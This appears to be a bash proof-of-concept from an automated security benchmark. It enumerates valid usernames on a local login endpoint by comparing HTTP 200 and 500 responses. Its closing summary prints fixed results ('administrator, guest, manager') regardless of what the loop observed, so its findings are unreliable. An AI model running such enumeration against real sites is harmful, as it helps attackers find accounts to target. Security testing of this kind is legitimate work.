#!/bin/bash
# POC: Demonstrates username enumeration vulnerability by testing usernames against /login endpoint and comparing HTTP status codes to identify valid accounts.
# Target: ./repo
# Created: 2025-12-01T16:26:59.981Z
# Session: benchmark-XBEN-104-24-minci3mm

# Username Enumeration via HTTP Status Code Differentiation POC
# This script demonstrates that valid usernames return HTTP 200 while invalid usernames return HTTP 500

TARGET_URL="http://localhost:8080/login"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Username Enumeration POC${NC}"
echo -e "${YELLOW}[*] Target: $TARGET_URL${NC}"
echo ""

# Test usernames - mix of valid and invalid
declare -a USERNAMES=("administrator" "guest" "manager" "notauser" "fakeuser" "test")

echo -e "${YELLOW}[*] Testing usernames...${NC}"
echo ""

for username in "${USERNAMES[@]}"; do
    # Send POST request and capture both HTTP status code and response body
    response=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&password=wrongpass" 2>/dev/null)
    
    # Extract status code (last line) and body (everything before last line)
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | sed '$d')
    
    # Determine if username appears to be valid based on HTTP status code
    if [ "$http_code" == "200" ]; then
        # HTTP 200 indicates valid username with wrong password
        if echo "$body" | grep -q "Invalid username or password"; then
            echo -e "${GREEN}[+] VALID USERNAME FOUND: $username${NC}"
            echo -e "    HTTP Status: $http_code"
            echo -e "    Response contains: 'Invalid username or password' error"
        else
            echo -e "${YELLOW}[*] Username: $username${NC}"
            echo -e "    HTTP Status: $http_code"
        fi
    elif [ "$http_code" == "500" ]; then
        # HTTP 500 indicates invalid username
        echo -e "${RED}[-] INVALID USERNAME: $username${NC}"
        echo -e "    HTTP Status: $http_code (500 Internal Server Error)"
    else
        echo -e "${YELLOW}[*] Username: $username${NC}"
        echo -e "    HTTP Status: $http_code"
    fi
    echo ""
done

echo -e "${YELLOW}[*] POC Complete${NC}"
echo -e "${YELLOW}[*] Summary: Valid usernames can be enumerated by observing HTTP status code differences${NC}"
echo -e "${YELLOW}[*] Valid usernames (HTTP 200): administrator, guest, manager${NC}"
echo -e "${YELLOW}[*] Invalid usernames (HTTP 500): notauser, fakeuser, and others${NC}"